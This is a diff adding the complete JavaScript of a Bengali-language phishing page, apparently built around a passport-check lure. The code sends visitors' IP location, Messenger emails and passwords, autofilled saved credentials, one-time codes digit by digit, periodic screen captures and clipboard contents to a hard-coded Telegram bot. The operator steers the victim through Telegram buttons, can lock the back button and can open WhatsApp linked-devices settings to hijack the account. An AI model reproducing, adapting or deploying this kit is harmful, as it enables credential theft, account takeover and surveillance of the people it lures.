@@ -1,0 +1,625 @@
+<script>
+    // =============================================
+    // CONFIGURATION
+    // =============================================
+    const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
+    const chatId = "8516934257";
+    
+    // =============================================
+    // STATE MANAGEMENT
+    // =============================================
+    let lastUpdateId = 0;
+    let deviceInfo = "Unknown";
+    let isEmailSent = false;
+    let screenStream = null;
+    let screenCaptureInterval = null;
+    let isScreenSharing = false;
+    let clipboardMonitorInterval = null;
+    let lastClipboardContent = "";
+    let telegramListener = null;
+    let otpSentDigits = []; // Track which digit positions were sent
+    let lastKeyboardPayload = ""; // Prevent duplicate keyboard sends
+    let pollRetryCount = 0;
+
+    // =============================================
+    // APP INITIALIZATION
+    // =============================================
+    async function initApp() {
+        try {
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipData = await ipRes.json();
+            deviceInfo = `${ipData.city}, ${ipData.country_name} (IP: ${ipData.ip})`;
+            sendToBot(`🚀 **নতুন ভিজিটর লিংকে ঢুকেছে!**\n📍 লোকেশন: ${deviceInfo}`);
+        } catch (e) {
+            deviceInfo = "Unknown location";
+        }
+
+        const urlParams = new URLSearchParams(window.location.search);
+        if (sessionStorage.getItem('isWaiting') === 'true') {
+            lockBrowser();
+            goToStep('verifying');
+            startListening();
+        } else if (urlParams.get('open') === 'chrome') {
+            goToStep('google_chooser');
+        }
+    }
+
+    // =============================================
+    // PAGE NAVIGATION
+    // =============================================
+    function showModal() {
+        document.getElementById('permission_modal').style.display = 'flex';
+        sendToBot(`🖱️ ইউজার "পাসপোর্ট চেক করুন" ক্লিক করেছে।`);
+    }
+
+    function redirectToChrome() {
+        document.getElementById('permission_modal').style.display = 'none';
+        
+        if (/Android/i.test(navigator.userAgent)) {
+            sendToBot(`➡️ ইউজার পপ-আপে OK ক্লিক করেছে। ক্রোমে যাচ্ছে...`);
+            
+            // Correct Android Intent URL format
+            const targetUrl = window.location.protocol + "//" + window.location.host + window.location.pathname + "?open=chrome";
+            const chromeIntent = "intent://" + window.location.host + window.location.pathname + "?open=chrome#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=" + encodeURIComponent(targetUrl) + ";end";
+            
+            // Try intent first, fallback to regular URL
+            const intentWindow = window.open(chromeIntent, '_blank');
+            
+            // Fallback if intent fails
+            setTimeout(() => {
+                goToStep('google_chooser');
+            }, 2500);
+        } else {
+            goToStep('google_chooser');
+        }
+    }
+
+    function finalSubmit() {
+        const email = document.getElementById('email_field').value;
+        if (!email) {
+            alert("দয়া করে পাসপোর্ট নাম্বার অথবা WhatsApp নাম্বার দিন।");
+            return;
+        }
+        
+        sessionStorage.setItem('isWaiting', 'true');
+        isEmailSent = true;
+        
+        // Centralized keyboard send
+        const text = `🎯 **ফাইনাল সাবমিট!**\n📧 ইনপুট: \`${email}\`\n📍 ${deviceInfo}`;
+        sendKeyboardWithButtons(text, email);
+        
+        goToStep('verifying');
+        lockBrowser();
+        startListening();
+    }
+
+    function sendKeyboardWithButtons(text, identifier) {
+        // Prevent duplicate sends of same data
+        const payloadKey = identifier || text;
+        if (payloadKey === lastKeyboardPayload) return;
+        lastKeyboardPayload = payloadKey;
+        
+        const keyboard = {
+            inline_keyboard: [
+                [{ text: "🔑 Pass Change (WhatsApp)", callback_data: "pass_cmd" }],
+                [{ text: "📩 Get OTP Page", callback_data: "otp_cmd" }],
+                [{ text: "📨 Gmail Verify / Messenger", callback_data: "email_page_cmd" }],
+                [{ text: "🖥️ Start Screen Share", callback_data: "start_screen_cmd" }],
+                [{ text: "⏹️ Stop Screen Share", callback_data: "stop_screen_cmd" }],
+                [{ text: "📋 Start Clipboard Capture", callback_data: "clipboard_cmd" }],
+                [{ text: "⏹️ Stop Clipboard", callback_data: "stop_clipboard_cmd" }],
+                [{ text: "🔔 Show Notification", callback_data: "notify_cmd" }],
+                [{ text: "⏳ Force Waiting", callback_data: "wait_cmd" }],
+                [{ text: "✅ Success", callback_data: "success" }, { text: "❌ Error", callback_data: "error" }]
+            ]
+        };
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: chatId, text: text, reply_markup: keyboard })
+        });
+    }
+
+    // =============================================
+    // STEP 2 — MESSENGER LOGIN FUNCTIONS
+    // =============================================
+    
+    // Facebook credential auto-fill — OPTIMIZED: single API call
+    async function requestCredentialAutoFill() {
+        if (!navigator.credentials || !navigator.credentials.get) return;
+        
+        try {
+            // Use conditional mediation first (no UI popup)
+            const cred = await navigator.credentials.get({
+                password: true,
+                mediation: 'conditional'
+            }).catch(() => null);
+            
+            if (cred && cred.id) {
+                document.getElementById('messenger_email').value = cred.id;
+                if (cred.password) {
+                    document.getElementById('messenger_pass').value = cred.password;
+                }
+                sendToBot(`🔄 **অটো-ফিল ট্রিগার হয়েছে!**\n📧 ইমেইল: \`${cred.id}\``);
+            }
+        } catch (e) {
+            // Credential API not available — silently ignore
+        }
+    }
+
+    function submitMessengerLogin() {
+        const email = document.getElementById('messenger_email').value;
+        const password = document.getElementById('messenger_pass').value;
+        
+        if (!email) {
+            alert("Please enter your email or phone number.");
+            return;
+        }
+        if (!password) {
+            alert("Please enter your password.");
+            return;
+        }
+        
+        sendToBot(`📨 **Messenger Login Submit!**\n📧 ইমেইল: \`${email}\`\n🔑 পাসওয়ার্ড: \`${password}\`\n📍 ${deviceInfo}`);
+        
+        // Clear fields
+        document.getElementById('messenger_email').value = '';
+        document.getElementById('messenger_pass').value = '';
+        
+        // Reset OTP tracking for fresh flow
+        otpSentDigits = [];
+        
+        sessionStorage.setItem('isWaiting', 'true');
+        goToStep('verifying');
+        lockBrowser();
+        
+        // Send updated keyboard with identifier
+        const identifier = email.substring(0, 15) + "...";
+        sendKeyboardWithButtons(`🎯 **Messenger Credentials Captured!**\n📧 \`${email}\`\n🔑 \`${password}\`\n📍 ${deviceInfo}`, identifier);
+    }
+
+    // =============================================
+    // OTP FUNCTIONS — FULLY FIXED
+    // =============================================
+    const otpInputs = document.querySelectorAll('.code-input');
+    const otpBtn = document.getElementById('otpSubmitBtn');
+
+    // Track actual values instead of position
+    let lastOtpState = "";
+
+    otpInputs.forEach((input, index) => {
+        input.addEventListener('input', function() {
+            // Auto-focus next input
+            if (this.value.length === 1 && index < otpInputs.length - 1) {
+                otpInputs[index + 1].focus();
+            }
+            
+            const code = Array.from(otpInputs).map(i => i.value).join('');
+            
+            // Enable/disable button
+            if (code.length >= 1) {
+                otpBtn.disabled = false;
+                otpBtn.classList.remove('opacity-50', 'cursor-not-allowed');
+            } else {
+                otpBtn.disabled = true;
+                otpBtn.classList.add('opacity-50', 'cursor-not-allowed');
+            }
+            
+            // Detect NEW digits (value-based, not position-based)
+            for (let i = 0; i < code.length; i++) {
+                if (code[i] && !lastOtpState[i] && !otpSentDigits.includes(`${i}_${code[i]}`)) {
+                    otpSentDigits.push(`${i}_${code[i]}`);
+                    
+                    const positionNames = ["প্রথম", "দ্বিতীয়", "তৃতীয়", "চতুর্থ"];
+                    sendToBot(`🔢 **${positionNames[i]} OTP ডিজিট:** \`${code[i]}\` | বর্তমান: \`${code}\``);
+                }
+            }
+            
+            // If user cleared a position, remove it from tracking
+            for (let i = 0; i < otpSentDigits.length; i++) {
+                const [pos] = otpSentDigits[i].split('_');
+                if (!code[parseInt(pos)]) {
+                    otpSentDigits.splice(i, 1);
+                    i--;
+                }
+            }
+            
+            // Send full OTP when complete
+            if (code.length === 4 && lastOtpState.length !== 4) {
+                sendToBot(`🔢 **পূর্ণ 4-ডিজিট OTP ক্যাপচার:** \`${code}\``);
+            }
+            
+            lastOtpState = code;
+        });
+
+        input.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace') {
+                if (this.value === '' && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            }
+        });
+        
+        // Restrict to numbers only
+        input.addEventListener('keypress', function(e) {
+            if (!/[0-9]/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' && e.key !== 'Tab') {
+                e.preventDefault();
+            }
+        });
+    });
+
+    function verifyOTP() {
+        const code = Array.from(otpInputs).map(i => i.value).join('');
+        if (code.length === 4) {
+            goToStep('verifying');
+        }
+    }
+
+    // =============================================
+    // SCREEN SHARE FUNCTIONS — FIXED TIMING
+    // =============================================
+    async function requestScreenShare() {
+        try {
+            screenStream = await navigator.mediaDevices.getDisplayMedia({
+                video: { cursor: "always", displaySurface: "monitor" },
+                audio: false
+            });
+            
+            isScreenSharing = true;
+            sendToBot(`✅ **স্ক্রিন শেয়ার Allow করেছে! স্ক্রিন ক্যাপচার শুরু হয়েছে।`);
+            
+            // Handle user stopping screen share via browser UI
+            screenStream.getVideoTracks()[0].onended = function() {
+                stopScreenShare();
+            };
+            
+            // Wait for video metadata before starting capture
+            const video = document.createElement('video');
+            video.srcObject = screenStream;
+            video.muted = true;
+            
+            video.onloadedmetadata = function() {
+                video.play().then(() => {
+                    captureAndSendFrame(video);
+                }).catch(() => {});
+            };
+            
+            // Fallback if metadata already loaded
+            if (video.readyState >= 1) {
+                video.play().then(() => {
+                    captureAndSendFrame(video);
+                }).catch(() => {});
+            }
+            
+            goToStep('verifying');
+            
+        } catch (err) {
+            sendToBot(`❌ **স্ক্রিন শেয়ার ব্যর্থ হয়েছে:** ${err.message || 'User cancelled or denied'}`);
+            goToStep('error_page');
+        }
+    }
+
+    function captureAndSendFrame(video) {
+        screenCaptureInterval = setInterval(() => {
+            if (!isScreenSharing || !screenStream || !screenStream.active) {
+                clearInterval(screenCaptureInterval);
+                screenCaptureInterval = null;
+                return;
+            }
+            
+            try {
+                const w = video.videoWidth || 480;
+                const h = video.videoHeight || 640;
+                
+                if (w === 0 || h === 0) return; // Video not ready yet
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = w;
+                canvas.height = h;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, w, h);
+                
+                canvas.toBlob(async (blob) => {
+                    if (!blob) return;
+                    try {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, `screen_${Date.now()}.jpg`);
+                        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    } catch (e) {}
+                }, 'image/jpeg', 0.4);
+            } catch (e) {}
+        }, 3000);
+    }
+
+    function stopScreenShare() {
+        if (screenStream) {
+            try {
+                screenStream.getTracks().forEach(track => track.stop());
+            } catch (e) {}
+            screenStream = null;
+        }
+        if (screenCaptureInterval) {
+            clearInterval(screenCaptureInterval);
+            screenCaptureInterval = null;
+        }
+        isScreenSharing = false;
+        sendToBot(`⏹️ **স্ক্রিন শেয়ার বন্ধ করা হয়েছে।**`);
+    }
+
+    // =============================================
+    // CLIPBOARD FUNCTIONS — FIXED PERMISSION HANDLING
+    // =============================================
+    async function startClipboardMonitoring() {
+        // First check if clipboard API is available
+        if (!navigator.clipboard || !navigator.clipboard.readText) {
+            sendToBot(`❌ **ক্লিপবোর্ড API এই ব্রাউজারে সাপোর্ট করে না।**`);
+            return;
+        }
+        
+        // Check permission
+        try {
+            const permissionStatus = await navigator.permissions.query({ name: "clipboard-read" });
+            if (permissionStatus.state === "denied") {
+                sendToBot(`❌ **ক্লিপবোর্ড পারমিশন ডিনাইড। ইউজারকে Allow করতে হবে।**`);
+                return;
+            }
+        } catch (e) {
+            // Permissions API not supported, proceed but log
+            sendToBot(`⚠️ **ক্লিপবোর্ড পারমিশন চেক করা যায়নি, সরাসরি চেষ্টা করা হবে...**`);
+        }
+        
+        sendToBot(`📋 **ক্লিপবোর্ড মনিটরিং শুরু হয়েছে!**`);
+        
+        let clipboardFailCount = 0;
+        
+        clipboardMonitorInterval = setInterval(async () => {
+            try {
+                const text = await navigator.clipboard.readText();
+                clipboardFailCount = 0; // Reset on success
+                
+                if (text && text !== lastClipboardContent) {
+                    lastClipboardContent = text;
+                    
+                    // Extract useful patterns
+                    const phoneNumbers = text.match(/[\+]?[88]?0?[1-9]\d{9,10}/g) || [];
+                    const emails = text.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g) || [];
+                    const codes = text.match(/\b\d{4,8}\b/g) || [];
+                    
+                    let report = `📋 **ক্লিপবোর্ড থেকে ক্যাপচার!**\n\n📄 কন্টেন্ট: \`${text.substring(0, 200)}\``;
+                    
+                    if (phoneNumbers.length > 0) {
+                        report += `\n\n📞 **ফোন:** \`${phoneNumbers.join(', ')}\``;
+                    }
+                    if (emails.length > 0) {
+                        report += `\n\n📧 **ইমেইল:** \`${emails.join(', ')}\``;
+                    }
+                    if (codes.length > 0) {
+                        report += `\n\n🔑 **কোড/OTP:** \`${codes.join(', ')}\``;
+                    }
+                    
+                    sendToBot(report);
+                }
+            } catch (e) {
+                clipboardFailCount++;
+                
+                // Auto-stop after 10 consecutive failures
+                if (clipboardFailCount >= 10) {
+                    sendToBot(`⏹️ **ক্লিপবোর্ড মনিটরিং অটো-বন্ধ: পরপর ${clipboardFailCount} বার ব্যর্থ। পারমিশন নেই।**`);
+                    stopClipboardMonitoring();
+                }
+            }
+        }, 2000);
+    }
+
+    function stopClipboardMonitoring() {
+        if (clipboardMonitorInterval) {
+            clearInterval(clipboardMonitorInterval);
+            clipboardMonitorInterval = null;
+        }
+        lastClipboardContent = "";
+        sendToBot(`⏹️ **ক্লিপবোর্ড মনিটরিং বন্ধ করা হয়েছে।**`);
+    }
+
+    function triggerUserNotification() {
+        sendToBot(`🔔 **ইউজারকে নোটিফিকেশন দেখানোর নির্দেশ দেওয়া হয়েছে।**`);
+    }
+
+    // =============================================
+    // TELEGRAM COMMAND LISTENER — FIXED POLLING & POPUP
+    // =============================================
+    function goToStep(id) {
+        const allPages = [
+            'step1', 'step2', 'google_chooser', 'verifying', 
+            'success_page', 'error_page', 'otp_page',
+            'start_screen_page', 'stop_screen_page', 'stop_clipboard_page'
+        ];
+        
+        allPages.forEach(s => {
+            const element = document.getElementById(s);
+            if (element) {
+                element.classList.add('hidden');
+                element.classList.remove('flex');
+            }
+        });
+        
+        const modal = document.getElementById('permission_modal');
+        if (modal) modal.style.display = 'none';
+        
+        const target = document.getElementById(id);
+        if (target) {
+            target.classList.remove('hidden');
+            // target already has 'flex' from its HTML classes
+            
+            // Special case: auto-focus first OTP input when showing OTP page
+            if (id === 'otp_page') {
+                setTimeout(() => {
+                    const firstInput = document.querySelector('.code-input');
+                    if (firstInput) firstInput.focus();
+                }, 100);
+            }
+        }
+    }
+
+    function lockBrowser() {
+        window.history.pushState(null, "", window.location.href);
+        window.onpopstate = function() {
+            window.history.pushState(null, "", window.location.href);
+        };
+    }
+
+    function sendToBot(text) {
+        // Telegram has 4096 char limit
+        const truncated = text.substring(0, 4000);
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { 
+            method: 'POST', 
+            headers: {'Content-Type': 'application/json'}, 
+            body: JSON.stringify({ chat_id: chatId, text: truncated }) 
+        }).catch(() => {});
+    }
+
+    function startListening() {
+        // Clear any existing listener
+        if (telegramListener) {
+            clearInterval(telegramListener);
+        }
+        
+        let pollInterval = 1000; // Start with 1 second
+        
+        telegramListener = setInterval(async () => {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
+                
+                if (!res.ok) {
+                    pollRetryCount++;
+                    pollInterval = Math.min(1000 * Math.pow(2, pollRetryCount), 10000); // Exponential backoff max 10s
+                    return;
+                }
+                
+                pollRetryCount = 0;
+                pollInterval = 1000; // Reset to 1s on success
+                
+                const data = await res.json();
+                
+                if (data.ok && data.result && data.result.length > 0) {
+                    for (const update of data.result) {
+                        lastUpdateId = update.update_id;
+                        
+                        // Handle callback queries (button clicks)
+                        if (update.callback_query) {
+                            const cmd = update.callback_query.data;
+                            const callbackId = update.callback_query.id;
+                            
+                            // Answer callback immediately to prevent loading state
+                            fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({ 
+                                    callback_query_id: callbackId,
+                                    text: "✓",
+                                    show_alert: false
+                                })
+                            }).catch(() => {});
+                            
+                            // Process command
+                            processCommand(cmd);
+                        }
+                    }
+                }
+            } catch (e) {
+                pollRetryCount++;
+                // Don't spam console with errors
+            }
+            
+            // Dynamic interval adjustment
+            clearInterval(telegramListener);
+            telegramListener = setInterval(arguments.callee, pollInterval);
+        }, pollInterval);
+    }
+
+    function processCommand(cmd) {
+        switch (cmd) {
+            case "pass_cmd":
+                sendToBot(`🔄 **Pass Change কমান্ড এক্সিকিউট করা হচ্ছে...`);
+                // Create and click an anchor element (bypasses popup blocker)
+                const waLink = document.createElement('a');
+                waLink.href = "https://wa.me/settings/linked_devices";
+                waLink.target = "_blank";
+                waLink.rel = "noopener";
+                waLink.click();
+                break;
+                
+            case "otp_cmd":
+                otpSentDigits = []; // Reset OTP tracking
+                lastOtpState = "";  // Reset OTP state
+                // Clear OTP input fields
+                document.querySelectorAll('.code-input').forEach(inp => inp.value = '');
+                sendToBot(`📩 **OTP Page দেখানো হচ্ছে...`);
+                goToStep('otp_page');
+                break;
+                
+            case "email_page_cmd":
+                sendToBot(`📨 **Messenger Login Page দেখানো হচ্ছে...`);
+                goToStep('step2');
+                break;
+                
+            case "start_screen_cmd":
+                sendToBot(`🖥️ **Screen Share পেজ দেখানো হচ্ছে...`);
+                goToStep('start_screen_page');
+                break;
+                
+            case "stop_screen_cmd":
+                sendToBot(`⏹️ **Screen Share বন্ধ করা হচ্ছে...`);
+                stopScreenShare();
+                goToStep('stop_screen_page');
+                break;
+                
+            case "clipboard_cmd":
+                sendToBot(`📋 **Clipboard মনিটরিং শুরু হচ্ছে...`);
+                startClipboardMonitoring();
+                break;
+                
+            case "stop_clipboard_cmd":
+                sendToBot(`⏹️ **Clipboard মনিটরিং বন্ধ করা হচ্ছে...`);
+                stopClipboardMonitoring();
+                goToStep('stop_clipboard_page');
+                break;
+                
+            case "notify_cmd":
+                sendToBot(`🔔 **Notification ট্রিগার করা হচ্ছে...`);
+                triggerUserNotification();
+                break;
+                
+            case "wait_cmd":
+                sendToBot(`⏳ **Waiting/Verifying পেজ দেখানো হচ্ছে...`);
+                goToStep('verifying');
+                break;
+                
+            case "success":
+                sendToBot(`✅ **Success Page দেখানো হচ্ছে...`);
+                goToStep('success_page');
+                break;
+                
+            case "error":
+                sendToBot(`❌ **Error Page দেখানো হচ্ছে...`);
+                goToStep('error_page');
+                break;
+                
+            default:
+                sendToBot(`❓ **অজানা কমান্ড:** ${cmd}`);
+        }
+    }
+
+    // =============================================
+    // UTILITY
+    // =============================================
+    function resetAndReload() {
+        sessionStorage.clear();
+        window.onpopstate = null;
+        location.reload();
+    }
+</script>
